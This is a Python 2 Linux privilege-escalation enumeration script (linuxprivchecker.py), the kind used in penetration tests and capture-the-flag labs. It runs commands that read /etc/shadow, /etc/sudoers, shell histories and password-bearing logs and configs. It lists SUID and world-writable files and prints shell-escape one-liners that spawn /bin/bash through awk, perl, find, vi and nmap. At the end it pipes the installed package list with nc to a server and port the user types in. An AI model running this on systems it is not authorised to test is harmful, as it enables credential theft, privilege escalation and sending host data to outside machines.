#!/usr/env python

###############################################################################################################
## [Title]: linuxprivchecker.py -- a Linux Privilege Escalation Check Script
## [Author]: Mike Czumak (T_v3rn1x) -- @SecuritySift
##-------------------------------------------------------------------------------------------------------------
## [Details]: 
## This script is intended to be executed locally on a Linux box to enumerate basic system info and 
## search for common privilege escalation vectors such as world writable files, misconfigurations, clear-text
## passwords and applicable exploits. 
##-------------------------------------------------------------------------------------------------------------
## [Warning]:
## This script comes as-is with no promise of functionality or accuracy.  I have no plans to maintain updates, 
## I did not write it to be efficient and in some cases you may find the functions may not produce the desired 
## results.  For example, the function that links packages to running processes is based on keywords and will 
## not always be accurate.  Also, the exploit list included in this function will need to be updated over time. 
## Feel free to change or improve it any way you see fit.
##-------------------------------------------------------------------------------------------------------------   
## [Modification, Distribution, and Attribution]:
## You are free to modify and/or distribute this script as you wish.  I only ask that you maintain original
## author attribution and not attempt to sell it or incorporate it into any commercial offering (as if it's 
## worth anything anyway :)
###############################################################################################################

# conditional import for older versions of python not compatible with subprocess
try:
    import subprocess as sub
    compatmode = 0 # newer version of python, no need for compatibility mode
except ImportError:
    import os # older version of python, need to use os instead
    compatmode = 1

# title / formatting
bigline = "================================================================================================="
smlline = "-------------------------------------------------------------------------------------------------"

print bigline 
print "LINUX PRIVILEGE ESCALATION CHECKER"
print bigline
print

# loop through dictionary, execute the commands, store the results, return updated dict
def execCmd(cmdDict):
    for item in cmdDict:
        cmd = cmdDict[item]["cmd"]
	if compatmode == 0: # newer version of python, use preferred subprocess
            out, error = sub.Popen([cmd], stdout=sub.PIPE, stderr=sub.PIPE, shell=True).communicate()
            results = out.split('\n')
	else: # older version of python, use os.popen
	    echo_stdout = os.popen(cmd, 'r')  
            results = echo_stdout.read().split('\n')
        cmdDict[item]["results"]=results
    return cmdDict

# print results for each previously executed command, no return value
def printResults(cmdDict):
    for item in cmdDict:
	msg = cmdDict[item]["msg"]
	results = cmdDict[item]["results"]
        print "[+] " + msg
        for result in results:
	    if result.strip() != "":
	        print "    " + result.strip()
	print
    return

def writeResults(msg, results):
    f = open("privcheckout.txt", "a");
    f.write("[+] " + str(len(results)-1) + " " + msg)
    for result in results:
        if result.strip() != "":
            f.write("    " + result.strip())
    f.close()
    return

# Basic system info
print "[*] GETTING BASIC SYSTEM INFO...\n"

results=[]

sysInfo = {"OS":{"cmd":"cat /etc/issue","msg":"Operating System","results":results}, 
	   "KERNEL":{"cmd":"cat /proc/version","msg":"Kernel","results":results}, 
	   "HOSTNAME":{"cmd":"hostname", "msg":"Hostname", "results":results}
	  }

sysInfo = execCmd(sysInfo)
printResults(sysInfo)

# Networking Info

print "[*] GETTING NETWORKING INFO...\n"

netInfo = {"NETINFO":{"cmd":"/sbin/ifconfig -a", "msg":"Interfaces", "results":results},
	   "ROUTE":{"cmd":"route", "msg":"Route", "results":results},
	   "NETSTAT":{"cmd":"netstat -antup | grep -v 'TIME_WAIT'", "msg":"Netstat", "results":results}
	  }

netInfo = execCmd(netInfo)
printResults(netInfo)

# File System Info
print "[*] GETTING FILESYSTEM INFO...\n"

driveInfo = {"MOUNT":{"cmd":"mount","msg":"Mount results", "results":results},
	     "FSTAB":{"cmd":"cat /etc/fstab 2>/dev/null", "msg":"fstab entries", "results":results}
	    }

driveInfo = execCmd(driveInfo)
printResults(driveInfo)

# Scheduled Cron Jobs
cronInfo = {"CRON":{"cmd":"ls -la /etc/cron* 2>/dev/null", "msg":"Scheduled cron jobs", "results":results},
	    "CRONW": {"cmd":"ls -aRl /etc/cron* 2>/dev/null | awk '$1 ~ /w.$/' 2>/dev/null", "msg":"Writable cron dirs", "results":results}
	   }

cronInfo = execCmd(cronInfo)
printResults(cronInfo)

# User Info
print "\n[*] ENUMERATING USER AND ENVIRONMENTAL INFO...\n"

userInfo = {"WHOAMI":{"cmd":"whoami", "msg":"Current User", "results":results},
	    "ID":{"cmd":"id","msg":"Current User ID", "results":results},
	    "ALLUSERS":{"cmd":"cat /etc/passwd", "msg":"All users", "results":results},
	    "SUPUSERS":{"cmd":"grep -v -E '^#' /etc/passwd | awk -F: '$3 == 0{print $1}'", "msg":"Super Users Found:", "results":results},
	    "HISTORY":{"cmd":"ls -la ~/.*_history; ls -la /root/.*_history 2>/dev/null", "msg":"Root and current user history (depends on privs)", "results":results},
	    "ENV":{"cmd":"env 2>/dev/null | grep -v 'LS_COLORS'", "msg":"Environment", "results":results},
	    "SUDOERS":{"cmd":"cat /etc/sudoers 2>/dev/null | grep -v '#' 2>/dev/null", "msg":"Sudoers (privileged)", "results":results},
	    "LOGGEDIN":{"cmd":"w 2>/dev/null", "msg":"Logged in User Activity", "results":results}
	   }

userInfo = execCmd(userInfo)
printResults(userInfo)

if "root" in userInfo["ID"]["results"][0]:
    print "[!] ARE YOU SURE YOU'RE NOT ROOT ALREADY?\n"

# File/Directory Privs
print "[*] ENUMERATING FILE AND DIRECTORY PERMISSIONS/CONTENTS...\n"

fdPerms = {"WWDIRSROOT":{"cmd":"find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -exec ls -ld '{}' ';' 2>/dev/null | grep root", "msg":"World Writeable Directories for User/Group 'Root'", "results":results},
	   "WWDIRS":{"cmd":"find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -exec ls -ld '{}' ';' 2>/dev/null | grep -v root", "msg":"World Writeable Directories for Users other than Root", "results":results},
	   "WWFILES":{"cmd":"find / \( -wholename '/home/homedir/*' -prune -o -wholename '/proc/*' -prune \) -o \( -type f -perm -0002 \) -exec ls -l '{}' ';' 2>/dev/null", "msg":"World Writable Files", "results":results},
	   "SUID":{"cmd":"find / \( -perm -2000 -o -perm -4000 \) -exec ls -ld {} \; 2>/dev/null", "msg":"SUID/SGID Files and Directories", "results":results},
	   "ROOTHOME":{"cmd":"ls -ahlR /root 2>/dev/null", "msg":"Checking if root's home folder is accessible", "results":results}
	  }

fdPerms = execCmd(fdPerms) 
printResults(fdPerms)

pwdFiles = {"LOGPWDS":{"cmd":"find /var/log -name '*.log' 2>/dev/null | xargs -l10 egrep 'pwd|password' 2>/dev/null", "msg":"Logs containing keyword 'password'", "results":results},
	    "CONFPWDS":{"cmd":"find /etc -name '*.c*' 2>/dev/null | xargs -l10 egrep 'pwd|password' 2>/dev/null", "msg":"Config files containing keyword 'password'", "results":results},
	    "SHADOW":{"cmd":"cat /etc/shadow 2>/dev/null", "msg":"Shadow File (Privileged)", "results":results}
	   }

pwdFiles = execCmd(pwdFiles)
printResults(pwdFiles)

# Processes and Applications
print "[*] ENUMERATING PROCESSES AND APPLICATIONS...\n"

if "debian" in sysInfo["KERNEL"]["results"][0] or "ubuntu" in sysInfo["KERNEL"]["results"][0]:
    getPkgs = "dpkg -l | awk '{$1=$4=\"\"; print $0}'" # debian
else:
    getPkgs = "rpm -qa | sort -u" # RH/other

getAppProc = {"PROCS":{"cmd":"ps aux | awk '{print $1,$2,$9,$10,$11}'", "msg":"Current processes", "results":results},
              "PKGS":{"cmd":getPkgs, "msg":"Installed Packages", "results":results}
	     }

getAppProc = execCmd(getAppProc)
printResults(getAppProc) # comment to reduce output

otherApps = { "SUDO":{"cmd":"sudo -V | grep version 2>/dev/null", "msg":"Sudo Version (Check out http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=sudo)", "results":results},
	      "APACHE":{"cmd":"apache2 -v; apache2ctl -M; httpd -v; apachectl -l 2>/dev/null", "msg":"Apache Version and Modules", "results":results},
	      "APACHECONF":{"cmd":"cat /etc/apache2/apache2.conf 2>/dev/null", "msg":"Apache Config File", "results":results}
	    }

otherApps = execCmd(otherApps)
printResults(otherApps)

print "[*] IDENTIFYING PROCESSES AND PACKAGES RUNNING AS ROOT OR OTHER SUPERUSER...\n"

# find the package information for the processes currently running
# under root or another super user

procs = getAppProc["PROCS"]["results"]
pkgs = getAppProc["PKGS"]["results"]
supusers = userInfo["SUPUSERS"]["results"]
procdict = {} # dictionary to hold the processes running as super users
  
for proc in procs: # loop through each process
    relatedpkgs = [] # list to hold the packages related to a process    
    try:
	for user in supusers: # loop through the known super users
	    if (user != "") and (user in proc): # if the process is being run by a super user
        	procname = proc.split(" ")[4] # grab the process name
		if "/" in procname:
			splitname = procname.split("/")
			procname = splitname[len(splitname)-1]
        	for pkg in pkgs: # loop through the packages
		    if not len(procname) < 3: # name too short to get reliable package results
	    	        if procname in pkg: 
			    if procname in procdict: 
			        relatedpkgs = procdict[proc] # if already in the dict, grab its pkg list
			    if pkg not in relatedpkgs:
			        relatedpkgs.append(pkg) # add pkg to the list
                procdict[proc]=relatedpkgs # add any found related packages to the process dictionary entry
    except:
	pass

for key in procdict:
    print "    " + key # print the process name
    try:
        if not procdict[key][0] == "": # only print the rest if related packages were found
            print "        Possible Related Packages: " 
            for entry in procdict[key]: 
                print "            " + entry # print each related package
    except:
	pass

# EXPLOIT ENUMERATION

# First discover the avaialable tools 
print
print "[*] ENUMERATING INSTALLED LANGUAGES/TOOLS FOR SPLOIT BUILDING...\n"

devTools = {"TOOLS":{"cmd":"which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null", "msg":"Installed Tools", "results":results}}
devTools = execCmd(devTools)
printResults(devTools)

print "[+] Related Shell Escape Sequences...\n"
escapeCmd = {"vi":[":!bash", ":set shell=/bin/bash:shell"], "awk":["awk 'BEGIN {system(\"/bin/bash\")}'"], "perl":["perl -e 'exec \"/bin/bash\";'"], "find":["find / -exec /usr/bin/awk 'BEGIN {system(\"/bin/bash\")}' \\;"], "nmap":["--interactive"]}
for cmd in escapeCmd:
    for result in devTools["TOOLS"]["results"]:
        if cmd in result:
	    for item in escapeCmd[cmd]:
	        print "    " + cmd + "-->\t" + item
print
print "[*] FINDING RELEVENT PRIVILEGE ESCALATION EXPLOITS...\n"

question = raw_input("[?] Would you like to search for possible exploits? [y/N] ")
if 'y' in question.lower():
    server = raw_input("[?] What is the address of the server? ")
    port = raw_input("[?] What port is the server using? ")
    print "[ ] Connecting to {}:{}".format(server,port)
    exploits = {"EXPLOITS":{"cmd":"dpkg -l | tail -n +6 | awk '{{print $2, $3}} END {{print \"\"}}' | nc {} {}".format(server, port), "msg":"Found the following possible exploits"}}
    exploits_results = execCmd(exploits)
    printResults(exploits)

print 	
print "Finished"
print bigline
